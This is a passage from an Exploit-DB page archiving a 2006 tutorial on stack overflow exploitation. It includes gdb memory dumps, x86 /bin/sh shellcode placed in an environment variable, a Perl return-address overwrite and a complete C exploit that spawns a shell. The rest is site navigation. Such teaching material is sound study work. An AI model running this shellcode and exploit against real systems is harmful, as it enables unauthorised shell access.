0xbffffb28:     0x1b    0xfc    0xff    0xbf    0x00    0x00    0x00    0x00
0xbffffb30:     0x28    0xfc    0xff    0xbf    0x55    0xfc    0xff    0xbf
0xbffffb38:     0x65    0xfc    0xff    0xbf    0x70    0xfc    0xff    0xbf
0xbffffb40:     0x91    0xfc    0xff    0xbf    0xa4    0xfc    0xff    0xbf
0xbffffb48:     0xad    0xfc    0xff    0xbf    0xe2    0xfe    0xff    0xbf
(gdb)
0xbffffb50:     0xed    0xfe    0xff    0xbf    0xff    0xfe    0xff    0xbf
0xbffffb58:     0x39    0xff    0xff    0xbf    0x4c    0xff    0xff    0xbf
0xbffffb60:     0x58    0xff    0xff    0xbf    0x66    0xff    0xff    0xbf
0xbffffb68:     0x71    0xff    0xff    0xbf    0x7a    0xff    0xff    0xbf
0xbffffb70:     0x89    0xff    0xff    0xbf    0x91    0xff    0xff    0xbf
0xbffffb78:     0xa9    0xff    0xff    0xbf    0xb5    0xff    0xff    0xbf
0xbffffb80:     0x00    0x00    0x00    0x00    0x10    0x00    0x00    0x00
0xbffffb88:     0xbf    0xfb    0xe9    0x07    0x06    0x00    0x00    0x00
0xbffffb90:     0x00    0x10    0x00    0x00    0x11    0x00    0x00    0x00
0xbffffb98:     0x64    0x00    0x00    0x00    0x03    0x00    0x00    0x00
0xbffffba0:     0x34    0x80    0x04    0x08    0x04    0x00    0x00    0x00
0xbffffba8:     0x20    0x00    0x00    0x00    0x05    0x00    0x00    0x00
0xbffffbb0:     0x07    0x00    0x00    0x00    0x07    0x00    0x00    0x00
0xbffffbb8:     0x00    0x00    0x00    0x40    0x08    0x00    0x00    0x00
0xbffffbc0:     0x00    0x00    0x00    0x00    0x09    0x00    0x00    0x00
0xbffffbc8:     0x30    0x83    0x04    0x08    0x0b    0x00    0x00    0x00
(gdb)
0xbffffbd0:     0xe8    0x03    0x00    0x00    0x0c    0x00    0x00    0x00
0xbffffbd8:     0xe8    0x03    0x00    0x00    0x0d    0x00    0x00    0x00
0xbffffbe0:     0xe8    0x03    0x00    0x00    0x0e    0x00    0x00    0x00
0xbffffbe8:     0xe8    0x03    0x00    0x00    0x0f    0x00    0x00    0x00
0xbffffbf0:     0x02    0xfc    0xff    0xbf    0x00    0x00    0x00    0x00
0xbffffbf8:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0xbffffc00:     0x00    0x00    0x69    0x36    0x38    0x36    0x00    0x2f
0xbffffc08:     0x68    0x6f    0x6d    0x65    0x2f    0x78    0x67    0x63
0xbffffc10:     0x2f    0x61    0x64    0x76    0x5f    0x73    0x74    0x61
0xbffffc18:     0x63    0x6b    0x00    0x41    0x41    0x41    0x41    0x41
0xbffffc20:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x00
0xbffffc28:     0x53    0x48    0x45    0x4c    0x4c    0x43    0x4f    0x44
0xbffffc30:     0x45    0x3d    0x90    0x90    0x90    0x90    0x90    0x90
0xbffffc38:     0x90    0x90    0x90    0x90    0x31    0xc0    0x50    0x68
0xbffffc40:     0x2f    0x2f    0x73    0x68    0x68    0x2f    0x62    0x69
0xbffffc48:     0x6e    0x89    0xe3    0x50    0x53    0x89    0xe1    0x99
(gdb) x/3s 0xbffffc18
0xbffffc18:      &quot;ck&quot;
0xbffffc1b:      &#039;A&#039; &lt;repeats 12 times&gt;
0xbffffc28:      &quot;SHELLCODE=\220\220\220\220\220\220\220\220\220\2201ÀPh//shh/bin\211ãPS\211á\231°\vÍ\200&quot;
(gdb) x/s 0xbffffc28+10
0xbffffc32:      &quot;\220\220\220\220\220\220\220\220\220\2201ÀPh//shh/bin\211ãPS\211á\231°\vÍ\200&quot;
(gdb)

After finding the address where the environment variable SHELLCODE is located, the command x/s is used to
examine just that string. But this address includes the string &quot;SHELLCODE=&quot;, so 16 bytes are added to the 
address to provide an address that is located somewhere in the NOP sled.

The debugger has revealed that the address 0xbffffc32 is right near the beginning of the NOP sled, and
the shellcode is stored in the environment variable SHELLCODE. Armed with this knowledge, some more Perl,
the vulnerable program can be exploited, as follows.

[xgc@knowledge:~]$ ./adv_stack `perl -e &#039;print &quot;\x32\xfc\xff\xbf&quot;x3&#039;`
sh-2.05b$


---------[ 0x2b0 - Analisys of Exploit Source C Code ]

Now let&#039;s check some exploit source C code:

#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;


/* here is a shellcode variable */

char shellcode[] =

   &quot;\x31\xc0\x50\x68//sh\x68/bin\x89\xe3&quot;
   &quot;\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80&quot;;


int main() {

/* we already know that eip is overwritten with 12bytes */

  char buff[12];

/* envp is an array of strings, conventionally of the form key=value, which are passed as environment
   to the new program. we&#039;ve put shellcode there. */

  char *env[2] = {shellcode,NULL};

  int i, retaddr, *pointer;

/* here is our simple formula to get shellcode location */

  retaddr = 0xbffffffa - strlen(shellcode) - strlen(&quot;./adv_stack&quot;);

/* build a loop to add return address many times into the buff. (retx3) = 12bytes */

  pointer = (int *)(buff);
  for(i = 0; i &lt; sizeof(buff); i += 4)
  *pointer++ = retaddr;

/* here execle executes the vulnerable source code with buff and the env at envp */

  execle(&quot;./adv_stack&quot;, &quot;adv_stack&quot;, buff, NULL, env);

  return 0;
}

[xgc@knowledge:~]$ gcc -o exploit exploit.c -Wall
[xgc@knowledge:~]$ ./exploit
sh-2.05b$


---------[ 0x2c0 - Conclusion ]

Methods if the buffer isn&#039;t big enough for the shellcode or if some Stack
protections are installed have been described. With that, codes not need to
be at stack memory and can be bypassed using environmental variable address.


|=-----------------------------------------------------------------------------=|

# milw0rm.com [2006-03-09]
            </code></pre>

                    </div>

                    <div class="card-footer">

                        <div class="row">

                            <div class="col">

                                <strong>Tags:</strong>

                                
                            </div>

                            <div class="col">

                                
                                
                            </div>

                            <div class="col">

                                <span class="float-right">

                                    <strong>Advisory/Source:</strong>

                                    <a href="" target="_blank">
                                        Link
                                    </a>

                                </span>

                            </div>

                        </div>

                        <div class="row mt-3">

                            <div class="btn-group ml-2">

                                <a class="btn btn-primary btn-fab btn-icon btn-round"
                                   href="/papers/13239" aria-label="View Previous Paper"
                                   data-toggle="tooltip" data-placement="top" title="Previous Paper" >
                                    <i class="mdi mdi-arrow-left mdi-36px"></i>
                                </a>

                            </div>

                            <div class="col">

                                <div class="btn-group float-right">

                                    <a class="btn btn-primary btn-fab btn-icon btn-round"
                                       href="/papers/13294" aria-label="View Next Paper"
                                       data-toggle="tooltip" data-placement="top" title="Next Paper" >
                                        <i class="mdi mdi-arrow-right mdi-36px"></i>
                                    </a>

                                </div>

                            </div>

                        </div>

                    </div>

                </div>

                <div class="card">

                    <div class="card-footer">

    <div class="d-none d-lg-block">

        <div class="container-fluid">

            <table class="table table-borderless text-center">

                <thead style="background-color:#083257;">

                <tr class="text-white">
                        <th>
                            <strong>Downloads</strong>
                        </th>
                        <th>
                            <strong>Certifications</strong>
                        </th>
                        <th>
                            <strong>Training</strong>
                        </th>
                        <th>
                            <strong>Professional Services</strong>
                        </th>
                    </tr>

                </thead>

                <tbody>

                <tr class="text-center">
                    <td>
                        <a href="https://www.kali.org/downloads/" target="_blank" rel="noopener">
                            Kali Linux
                        </a>
                    </td>
                    <td>
                        <a href="/pentest-training-with-kali-linux"
                           target="_blank" rel="noopener">OSCP
                        </a>
                    </td>
                    <td>
                        <a href="/pentest-training-with-kali-linux"
                           target="_blank" rel="noopener">Penetration Testing with Kali Linux (PWK) (PEN-200)
                           <br />All new for 2020
                        </a>
                    </td>
                    <td>
                        <a href="https://www.offensive-security.com/penetration-testing/"
                           target="_blank" rel="noopener">Penetration Testing
                        </a>
                    </td>
                </tr>

                <tr class="text-center">
                    <td>
                        <a href="https://www.offensive-security.com/kali-linux-nethunter-download/"
                           target="_blank" rel="noopener">
                            Kali NetHunter
                        </a>
                    </td>
                    <td>
                        <a href="/wireless-attacks-training"
                           target="_blank" rel="noopener">OSWP
                        </a>
                    </td>
                    <td>
                        <a href="/wireless-attacks-training"
                           target="_blank" rel="noopener">Offensive Security Wireless Attacks (WiFu) (PEN-210)
                        </a>
                    </td>
                    <td>
                        <a href="https://www.offensive-security.com/penetration-testing/#other-services"
                           target="_blank" rel="noopener">Advanced Attack Simulation
                        </a>
                    </td>
                </tr>
                <tr>
                    <td>
                        <a href="https://kali.training/downloads/Kali-Linux-Revealed-1st-edition.pdf"
                           target="_blank" rel="noopener">Kali Linux Revealed Book
                        </a>
                    </td>
                    <td>
                        <a href="/evasion-techniques-breaching-defenses"
                           target="_blank" rel="noopener">OSEP
                        </a>
                    </td>
                    <td>
                        <a href="/evasion-techniques-breaching-defenses"
                           target="_blank" rel="noopener">Evasion Techniques and Breaching Defences (PEN-300)
                           <br />All new for 2020
                        </a>
                    </td>
                    <td>
                        <a href="https://www.offensive-security.com/penetration-testing/#asa"
                           target="_blank" rel="noopener">Application Security Assessment
                        </a>
                    </td>
                </tr>

                <tr class="text-center">
                    <td></td>
                    <td>
                        <a href="/advanced-web-attacks"
                           target="_blank" rel="noopener">OSWE
                        </a>
                    </td>
                    <td>
                        <a href="/advanced-web-attacks"
                           target="_blank" rel="noopener">Advanced Web Attacks and Exploitation (AWAE) (WEB-300)
                           <br />Updated for 2020
                        </a>
                    </td>
                    <td></td>
                </tr>

                <tr class="text-center">
                    <td></td>
                    <td>
                        <a href="/windows-user-mode-exploit-development"
                           target="_blank" rel="noopener">OSED
                        </a>
                    </td>
                    <td>
                        <a href="/windows-user-mode-exploit-development"
                           target="_blank" rel="noopener">Windows User Mode Exploit Development (EXP-301)
                           <br />All new for 2021
                        </a>
                    </td>
                    <td></td>
                </tr>

                <tr class="text-center">
                    <td></td>
                    <td>
                        <a href="https://www.offensive-security.com/awe-osee/"
                           target="_blank" rel="noopener">OSEE
                        </a>
                    </td>
                    <td>
<!--
                        <a href="https://www.offensive-security.com/metasploit-unleashed/"
                           target="_blank" rel="noopener">[Free] Metasploit Unleashed (MSFU)
                        </a>
-->
                    </td>
                    <td></td>
                </tr>

                <tr class="text-center">
                    <td></td>
                    <td>
                        <a href="https://kali.training/"
                           target="_blank" rel="noopener">KLCP
                        </a>
                    </td>
                    <td>
                        <a href="https://kali.training/courses/kali-linux-revealed/"
                           target="_blank" rel="noopener" title="Your journey starts here!">[Free] Kali Linux Revealed
                        </a>
                    </td>
                    <td></td>
                </tr>

                </tbody>

            </table>

        </div>

    </div>

    <div class="d-lg-none text-center">

        <div class="btn-group btn-block mt-1">

            <a class="btn btn-block btn-primary dropdown-toggle" href="#" role="button" id="dropdownDownloads" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                Downloads
            </a>

            <div class="dropdown-menu" aria-labelledby="dropdownDownloads">

                <a class="dropdown-item" href="https://www.kali.org/downloads/" target="_blank" rel="noopener">
                    Kali Linux
                </a>
                <a class="dropdown-item"
                   href="https://www.offensive-security.com/kali-linux-nethunter-download/"
                   target="_blank" rel="noopener">
                    Kali NetHunter
                </a>
                <a class="dropdown-item"
                   href="https://kali.training/downloads/Kali-Linux-Revealed-1st-edition.pdf"
                   target="_blank" rel="noopener">
                    Kali Linux Revealed Book
                </a>

            </div>

        </div>

        <div class="btn-group btn-block mt-1">

            <a class="btn btn-block btn-primary dropdown-toggle" href="#" role="button" id="dropdownCerts" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                Certifications
            </a>

            <div class="dropdown-menu" aria-labelledby="dropdownCerts">

                <a class="dropdown-item"
                   href="/pentest-training-with-kali-linux"
                   target="_blank" rel="noopener">OSCP
                </a>
                <a class="dropdown-item"
                   href="/wireless-attacks-training"
                   target="_blank" rel="noopener">OSWP
                </a>
                <a class="dropdown-item"
                   href="/evasion-techniques-breaching-defenses"
                   target="_blank" rel="noopener">OSEP
                </a>
                <a class="dropdown-item"
                   href="/advanced-web-attacks"
                   target="_blank" rel="noopener">OSWE
                </a>
                <a class="dropdown-item"
                   href="/windows-user-mode-exploit-development"
                   target="_blank" rel="noopener">OSED
                </a>
                <a class="dropdown-item"
                   href="https://www.offensive-security.com/awe-osee/"
                   target="_blank" rel="noopener">OSEE
                </a>
                <a class="dropdown-item" href="https://kali.training/"
                   target="_blank" rel="noopener">KLCP
                </a>

            </div>

        </div>

        <div class="btn-group btn-block mt-1">

            <a class="btn btn-block btn-primary dropdown-toggle" href="#" role="button" id="dropdownTraining" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                Training
            </a>

            <div class="dropdown-menu" aria-labelledby="dropdownTraining">

                <a class="dropdown-item"
                   href="/pentest-training-with-kali-linux"
                   target="_blank" rel="noopener"> - Penetration Testing with Kali Linux (PWK) (PEN-200)
                   <br />All new for 2020
                </a>
                <a class="dropdown-item"
                   href="/wireless-attacks-training"
                   target="_blank" rel="noopener">Offensive Security Wireless Attacks (WiFu) (PEN-210)
                </a>
                <a class="dropdown-item"
                   href="/evasion-techniques-breaching-defenses"
                   target="_blank" rel="noopener">Evasion Techniques and Breaching Defences (PEN-300)
                   <br />All new for 2020
                </a>
                <a class="dropdown-item"
                   href="/advanced-web-attacks"
                   target="_blank" rel="noopener">Advanced Web Attacks and Exploitation (AWAE) (WEB-300)
                   <br />Updated for 2020
                </a>
                <a class="dropdown-item"
                   href="/windows-user-mode-exploit-development"
                   target="_blank" rel="noopener">Windows User Mode Exploit Development (EXP-301)
                   <br />All new for 2021
                </a>
<!--
                <a class="dropdown-item" href="https://www.offensive-security.com/metasploit-unleashed/"
                   target="_blank" rel="noopener">[Free] Metasploit Unleashed (MSFU)
                </a>
-->
                <a class="dropdown-item" href="https://kali.training/courses/kali-linux-revealed/" target="_blank"
                   target="_blank" rel="noopener" title="Your journey starts here!">[Free] Kali Linux Revealed
                </a>

            </div>

        </div>

        <div class="btn-group btn-block mt-1">

            <a class="btn btn-block btn-primary dropdown-toggle" href="#" role="button" id="dropdownServices" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                Pro Services
            </a>

            <div class="dropdown-menu" aria-labelledby="dropdownServices">

                <a class="dropdown-item" href="https://www.offensive-security.com/penetration-testing/"
                   target="_blank" rel="noopener">Penetration Testing
                </a>
                <a class="dropdown-item" href="https://www.offensive-security.com/penetration-testing/#other-services"
                   target="_blank" rel="noopener">Advanced Attack Simulation
                </a>
                <a class="dropdown-item" href="https://www.offensive-security.com/penetration-testing/#asa"
                   target="_blank" rel="noopener">Application Security Assessment
                </a>

            </div>

        </div>

    </div>

</div>

                </div>

            </div>

        </div>

    </div>


        
        <footer class="footer">

    <div class="container-fluid">

        <nav>

            <ul>

                <li>
                    <a href="https://twitter.com/exploitdb" target="_blank" aria-label="Exploit-DB Twitter" rel="noopener">

    <i class="mdi mdi-twitter mdi-36px"></i>

</a>


<a href="https://www.facebook.com/ExploitDB" target="_blank" aria-label="Exploit-DB Facebook" rel="noopener">

    <i class="mdi mdi-facebook mdi-36px"></i>
</a>

<a href="https://github.com/offensive-security/exploitdb" target="_blank" aria-label="Exploit-DB GitHub" rel="noopener">

    <i class="mdi mdi-github-circle mdi-36px"></i>
</a>                </li>

                <li>

                    <a href="/">
                        Exploit Database by Offensive Security
                    </a>

                </li>

                <li>

                    <a href="/terms">
                        Terms
                    </a>

                </li>

                <li>

                    <a href="/privacy">
                        Privacy
                    </a>

                </li>

                <li>

                    <a href="#" data-toggle="modal" data-target="#about">
                        About Us
                    </a>

                </li>

                <li>

                    <a href="/faq">
                        FAQ
                    </a>

                </li>

                <li>

                    <a href="/cookies">
                        Cookies
                    </a>

                </li>

            </ul>

        </nav>

        <div class="copyright mt-4">

            &copy;
            <a href="https://www.offensive-security.com/" target="_blank">OffSec Services Limited</a> 2021. All rights reserved.

        </div>

    </div>

    <!-- About EDB/GHDB Modal -->
<div class="modal fade bd-example-modal-lg" id="about" tabindex="-1"
     role="dialog" aria-labelledby="searchModalTitle" aria-hidden="true">

    <div class="modal-dialog modal-dialog-centered modal-dialog modal-lg"
         role="document">

        <div class="modal-content">

            <div class="modal-header">

                <h5 class="modal-title"
                    id="aboutModalTitle">About The Exploit Database
                </h5>

                <button type="button" class="close" data-dismiss="modal"
                        aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                </button>

            </div>

            <div class="modal-body">

                <div class="row">

                    <p>
                        <a href="https://www.offensive-security.com/" target="_blank" rel="noopener">
                            <img class="float-left" src="/images/offsec-logo-gray-trans-300x171.png"
                                 alt="Offensive Security">
                        </a>
                        The Exploit Database is maintained by <a
                                href="https://www.offensive-security.com/community-projects/"
                                target="_blank" rel="noopener">Offensive Security</a>, an information security training company
                        that provides various <a
                                href="https://www.offensive-security.com/courses-and-certifications/"
                                target="_blank" rel="noopener">Information Security Certifications</a> as well as high end <a
                                href="https://www.offensive-security.com/penetration-testing/"
                                target="_blank" rel="noopener">penetration testing</a> services. The Exploit Database is a
                        non-profit project that is provided as a public service by Offensive Security.
                    </p>

                    <p>The Exploit Database is a <a
                                href="http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html" target="_blank" rel="noopener">CVE
                            compliant</a> archive of public exploits and corresponding vulnerable software,
                        developed for use by penetration testers and vulnerability researchers. Our aim is to serve
                        the most comprehensive collection of exploits gathered through direct submissions, mailing
                        lists, as well as other public sources, and present them in a freely-available and
                        easy-to-navigate database. The Exploit Database is a repository for exploits and
                        proof-of-concepts rather than advisories, making it a valuable resource for those who need
                        actionable data right away.
                    </p>

                    <p>The <a href="/google-hacking-database">Google Hacking Database (GHDB)</a>
                        is a categorized index of Internet search engine queries designed to uncover interesting,
                        and usually sensitive, information made publicly available on the Internet. In most cases,
                        this information was never meant to be made public but due to any number of factors this
                        information was linked in a web document that was crawled by a search engine that
                        subsequently followed that link and indexed the sensitive information.
                    </p>

                    <p>The process known as “Google Hacking” was popularized in 2000 by Johnny
                        Long, a professional hacker, who began cataloging these queries in a database known as the
                        Google Hacking Database. His initial efforts were amplified by countless hours of community
                        member effort, documented in the book Google Hacking For Penetration Testers and popularised
                        by a barrage of media attention and Johnny’s talks on the subject such as this early talk
                        recorded at <a href="https://www.defcon.org/html/links/dc-archives/dc-13-archive.html"
                                       target="_blank" rel="noopener">DEFCON 13</a>. Johnny coined the term “Googledork” to refer
                        to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
                        the fact that this was not a “Google problem” but rather the result of an often
                        unintentional misconfiguration on the part of a user or a program installed by the user.
                        Over time, the term “dork” became shorthand for a search query that located sensitive
                        information and “dorks” were included with may web application vulnerability releases to
                        show examples of vulnerable web sites.
                    </p>

                    <p>After nearly a decade of hard work by the community, Johnny turned the GHDB
                        over to <a
                                href="https://www.offensive-security.com/community-projects/"
                                target="_blank" rel="noopener">Offensive Security</a> in November 2010, and it is now maintained as
                        an extension of the <a href="/">Exploit Database</a>. Today, the GHDB includes searches for
                        other online search engines such as <a href="https://www.bing.com/" target="_blank" rel="noopener">Bing</a>,
                        and other online repositories like <a href="https://github.com/" target="_blank" rel="noopener">GitHub</a>,
                        producing different, yet equally valuable results.
                    </p>


                </div>

            </div>

            <div class="modal-footer">

                <button type="button"
                        class="btn btn-primary"
                        data-dismiss="modal">Close
                </button>

            </div>

        </div>

    </div>

</div>


    <div class="modal fade bd-example-modal-lg" id="osresources" tabindex="-1"
     role="dialog" aria-labelledby="searchModalTitle" aria-hidden="true">

    <div class="modal-dialog modal-dialog-centered modal-dialog modal-lg"
         role="document">

        <div class="modal-content">

            <div class="modal-header">

                <h5 class="modal-title text-primary"
                    id="resourcesModalTitle">Offensive Security Resources
                </h5>

                <button type="button" class="close" data-dismiss="modal"
                        aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                </button>

            </div>

            <div class="modal-body">

                <table class="table dataTable table-borderless">

                            <thead>

                            <tr>
                                <th class="text-center"><strong>Downloads</strong></th>
                                <th class="text-center"><strong>Certifications</strong></th>
                                <th class="text-center"><strong>Training</strong></th>
                                <th class="text-center"><strong>Services</strong></th>
                            </tr>

                            </thead>

                            <tbody>

                            <tr class="text-center">

                                <td>
                                    <a href="https://www.kali.org/downloads/" target="_blank" rel="noopener">
                                        Kali Linux
                                    </a>
                                </td>
                                <td>
                                    <a href="/pentest-training-with-kali-linux"
                                       target="_blank" rel="noopener">OSCP
                                    </a>
                                </td>
                                <td>
                                    <a href="/pentest-training-with-kali-linux"
                                       target="_blank" rel="noopener">Penetration Testing with Kali Linux (PWK) (PEN-200)
                                       <br />All new for 2020
                                    </a>
                                </td>
                                <td>
                                    <a href="https://www.offensive-security.com/penetration-testing/"
                                       target="_blank" rel="noopener">Penetration Testing
                                    </a>
                                </td>

                            </tr>

                            <tr class="text-center">

                                <td>
                                    <a href="https://www.offensive-security.com/kali-linux-nethunter-download/"
                                       target="_blank" rel="noopener">
                                        Kali NetHunter
                                    </a>
                                </td>
                                <td>
                                    <a href="/wireless-attacks-training"
                                       target="_blank" rel="noopener">OSWP
                                    </a>
                                </td>
                                <td>
                                    <a href="/wireless-attacks-training"
                                       target="_blank" rel="noopener">Offensive Security Wireless Attacks (WiFu) (PEN-210)
                                    </a>
                                </td>
                                <td>
                                    <a href="https://www.offensive-security.com/penetration-testing/#other-services"
                                       target="_blank" rel="noopener">Advanced Attack Simulation
                                    </a>
                                </td>

                            </tr>

                            <tr class="text-center">

                                <td>
                                    <a href="https://kali.training/downloads/Kali-Linux-Revealed-1st-edition.pdf"
                                       target="_blank" rel="noopener">Kali Linux Revealed Book
                                    </a>
                                </td>
                                <td>
                                    <a href="/evasion-techniques-breaching-defenses"
                                       target="_blank" rel="noopener">OSEP
                                    </a>
                                </td>
                                <td>
                                    <a href="/evasion-techniques-breaching-defenses"
                                       target="_blank" rel="noopener">Evasion Techniques and breaching Defences (PEN-300)
                                       <br />All new for 2020
                                    </a>
                                </td>
                                <td>
                                    <a href="https://www.offensive-security.com/penetration-testing/#asa"
                                       target="_blank" rel="noopener">Application Security Assessment
                                    </a>
                                </td>

                            </tr>

                            <tr class="text-center">
                                <td></td>
                                <td>
                                    <a href="/advanced-web-attacks"
                                       target="_blank" rel="noopener">OSWE
                                    </a>
                                </td>
                                <td>
                                    <a href="/advanced-web-attacks"
                                       target="_blank" rel="noopener">Advanced Web Attacks and Exploitation (AWAE) (WEB-300)
                                       <br />Updated for 2020
                                    </a>
                                </td>
                                <td></td>
                            </tr>

                            <tr class="text-center">
                                <td></td>
                                <td>
                                    <a href="/windows-user-mode-exploit-development"
                                       target="_blank" rel="noopener">OSED
                                    </a>
                                </td>
                                <td>
                                    <a href="/windows-user-mode-exploit-development"
                                       target="_blank" rel="noopener">Windows User Mode Exploit Development (EXP-301)
                                       <br />All new for 2021
                                    </a>
                                </td>
                                <td></td>
                            </tr>

                            <tr class="text-center">
                                <td></td>
                                <td>
                                    <a href="https://www.offensive-security.com/awe-osee/"
                                       target="_blank" rel="noopener">OSEE
                                    </a>
                                </td>
                                <td>
<!--
                                    <a href="https://www.offensive-security.com/metasploit-unleashed/"
                                       target="_blank" rel="noopener">[Free] Metasploit Unleashed (MSFU)
                                    </a>
-->
                                </td>
                                <td></td>
                            </tr>

                            <tr class="text-center">
                                <td></td>
                                <td>
                                    <a href="https://kali.training/"
                                       target="_blank" rel="noopener">KLCP
                                    </a>
                                </td>
                                <td>
                                    <a href="https://kali.training/courses/kali-linux-revealed/" target="_blank"
                                       target="_blank" rel="noopener" title="Your journey starts here!">[Free] Kali Linux Revealed
                                    </a>
                                </td>
                                <td></td>
                            </tr>

                            </tbody>

                        </table>

            </div>

            <div class="modal-footer">

                <button type="button"
                        class="btn btn-primary"
                        data-dismiss="modal">Close
                </button>

            </div>

        </div>

    </div>

</div>

    <!-- Advanced Search Modal -->
<div class="modal fade bd-example-modal-lg" id="search" tabindex="-1"
     role="dialog" aria-labelledby="searchModalTitle" aria-hidden="true">

    <div class="modal-dialog modal-dialog-centered modal-dialog modal-lg"
         role="document">

        <div class="modal-content">

            <div class="modal-header">

                <h5 class="modal-title"
                    id="searchModalTitle">Search The Exploit Database
                </h5>

                <button type="button" class="close" data-dismiss="modal"
                        aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                </button>

            </div>

            <div class="modal-body">

                <form action="https://www.exploit-db.com/search" method="GET" id="searchForm">

                    <div class="row">

                        <div class="col-sm-12 col-lg-8">

                            <div class="form-group">

                                <label for="titleSearch" class="control-label text-primary">Title</label>

                                <input id="titleSearch" class="form-control" type="text" name="q" class="q"
                                       placeholder="Title" value="" autofocus>

                            </div>

                        </div>

                        <div class="col-sm-6 col-lg-4">

                            <div class="form-group">

                                <label for="cveSearch" class="control-label text-primary">CVE</label>

                                <input id="cveSearch" class="form-control" type="text" name="cve" class="cve"
                                       placeholder="2021-1234"
                                       value="" autofocus>

                            </div>

                        </div>

                    </div>

                    <div class="row">

                        <div class="col-sm-6 col-lg-4">

                            <label for="typeSearchSelect" class="text-primary">Type</label>

                            <select id="typeSearchSelect" name="type" class="form-control">

                                <option></option>
                                
                                    <option value="dos" >
                                        dos
                                    </option>


                                
                                    <option value="local" >
                                        local
                                    </option>


                                
                                    <option value="remote" >
                                        remote
                                    </option>


                                
                                    <option value="shellcode" >
                                        shellcode
                                    </option>


                                
                                    <option value="papers" >
                                        papers
                                    </option>


                                
                                    <option value="webapps" >
                                        webapps
                                    </option>


                                
                            </select>

                        </div>

                        <div class="col-sm-6 col-lg-4">

                            <label for="platformSearchSelect" class="text-primary">Platform</label>

                            <select id="platformSearchSelect" name="platform" class="form-control">

                                <option></option>
                                
                                    <option value="aix" >
                                        AIX
                                    </option>

                                
                                    <option value="asp" >
                                        ASP
                                    </option>

                                
                                    <option value="bsd" >
                                        BSD
                                    </option>

                                
                                    <option value="bsd_ppc" >
                                        BSD_PPC
                                    </option>

                                
                                    <option value="bsd_x86" >
                                        BSD_x86
                                    </option>

                                
                                    <option value="bsdi_x86" >
                                        BSDi_x86
                                    </option>

                                
                                    <option value="cgi" >
                                        CGI
                                    </option>

                                
                                    <option value="freebsd" >
                                        FreeBSD
                                    </option>

                                
                                    <option value="freebsd_x86" >
                                        FreeBSD_x86
                                    </option>

                                
                                    <option value="freebsd_x86-64" >
                                        FreeBSD_x86-64
                                    </option>

                                
                                    <option value="generator" >
                                        Generator
                                    </option>

                                
                                    <option value="hardware" >
                                        Hardware
                                    </option>

                                
                                    <option value="hp-ux" >
                                        HP-UX
                                    </option>

                                
                                    <option value="irix" >
                                        IRIX
                                    </option>

                                
                                    <option value="jsp" >
                                        JSP
                                    </option>

                                
                                    <option value="linux" >
                                        Linux
                                    </option>

                                
                                    <option value="linux_mips" >
                                        Linux_MIPS
                                    </option>

                                
                                    <option value="linux_ppc" >
                                        Linux_PPC
                                    </option>

                                
                                    <option value="linux_sparc" >
                                        Linux_SPARC
                                    </option>

                                
                                    <option value="linux_x86" >
                                        Linux_x86
                                    </option>

                                
                                    <option value="linux_x86-64" >
                                        Linux_x86-64
                                    </option>

                                
                                    <option value="minix" >
                                        MINIX
                                    </option>

                                
                                    <option value="multiple" >
                                        Multiple
                                    </option>

                                
                                    <option value="netbsd_x86" >
                                        NetBSD_x86
                                    </option>

                                
                                    <option value="novell" >
                                        Novell
                                    </option>

                                
                                    <option value="openbsd" >
                                        OpenBSD
                                    </option>

                                
                                    <option value="openbsd_x86" >
                                        OpenBSD_x86
                                    </option>

                                
                                    <option value="osx_ppc" >
                                        OSX_PPC
                                    </option>

                                
                                    <option value="osx" >
                                        OSX
                                    </option>

                                
                                    <option value="php" >
                                        PHP
                                    </option>

                                
                                    <option value="plan9" >
                                        Plan9
                                    </option>

                                
                                    <option value="qnx" >
                                        QNX
                                    </option>

                                
                                    <option value="sco" >
                                        SCO
                                    </option>

                                
                                    <option value="sco_x86" >
                                        SCO_x86
                                    </option>

                                
                                    <option value="solaris" >
                                        Solaris
                                    </option>

                                
                                    <option value="solaris_sparc" >
                                        Solaris_SPARC
                                    </option>

                                
                                    <option value="solaris_x86" >
                                        Solaris_x86
                                    </option>

                                
                                    <option value="tru64" >
                                        Tru64
                                    </option>

                                
                                    <option value="ultrix" >
                                        ULTRIX
                                    </option>

                                
                                    <option value="unix" >
                                        Unix
                                    </option>

                                
                                    <option value="unixware" >
                                        UnixWare
                                    </option>

                                
                                    <option value="windows_x86" >
                                        Windows_x86
                                    </option>

                                
                                    <option value="windows_x86-64" >
                                        Windows_x86-64
                                    </option>

                                
                                    <option value="windows" >
                                        Windows
                                    </option>

                                
                                    <option value="arm" >
                                        ARM
                                    </option>

                                
                                    <option value="cfm" >
                                        CFM
                                    </option>

                                
                                    <option value="netware" >
                                        Netware
                                    </option>

                                
                                    <option value="superh_sh4" >
                                        SuperH_SH4
                                    </option>

                                
                                    <option value="java" >
                                        Java
                                    </option>

                                
                                    <option value="beos" >
                                        BeOS
                                    </option>

                                
                                    <option value="immunix" >
                                        Immunix
                                    </option>

                                
                                    <option value="palm_os" >
                                        Palm_OS
                                    </option>

                                
                                    <option value="atheos" >
                                        AtheOS
                                    </option>

                                
                                    <option value="ios" >
                                        iOS
                                    </option>

                                
                                    <option value="android" >
                                        Android
                                    </option>

                                
                                    <option value="xml" >
                                        XML
                                    </option>

                                
                                    <option value="perl" >
                                        Perl
                                    </option>

                                
                                    <option value="python" >
                                        Python
                                    </option>

                                
                                    <option value="system_z" >
                                        System_z
                                    </option>

                                
                                    <option value="json" >
                                        JSON
                                    </option>

                                
                                    <option value="ashx" >
                                        ASHX
                                    </option>

                                
                                    <option value="ruby" >
                                        Ruby
                                    </option>

                                
                                    <option value="aspx" >
                                        ASPX
                                    </option>

                                
                                    <option value="macos" >
                                        macOS
                                    </option>

                                
                                    <option value="linux_crisv32" >
                                        Linux_CRISv32
                                    </option>

                                
                                    <option value="ezine" >
                                        eZine
                                    </option>

                                
                                    <option value="magazine" >
                                        Magazine
                                    </option>

